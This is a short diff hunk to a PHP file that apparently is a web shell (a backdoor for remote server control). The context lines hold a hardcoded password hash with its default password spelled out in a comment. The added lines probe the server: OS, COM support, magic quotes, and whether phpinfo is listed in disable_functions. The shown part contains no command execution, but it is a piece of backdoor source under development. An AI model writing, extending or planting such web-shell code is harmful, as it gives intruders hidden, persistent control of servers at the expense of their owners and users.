@@ -16,6 +16,17 @@ error_reporting(E_ALL);
 @set_magic_quotes_runtime(0);
 @define('VERSION', '3.0');
 @clearstatcache();
+error_reporting(7);
+ob_start();
+$mtime = explode(' ', microtime());
+$starttime = $mtime[1] + $mtime[0];
+define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
+//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );
+define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
+define('IS_COM', class_exists('COM') ? 1 : 0 );
+define('IS_GPC', get_magic_quotes_gpc());
+$dis_func = get_cfg_var('disable_functions');
+define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
 
 $auth_pass = "c32fd5fdb63492c85ffa546fd2c811c8"; // default: ALxWahid
 $color = "#00ff00";
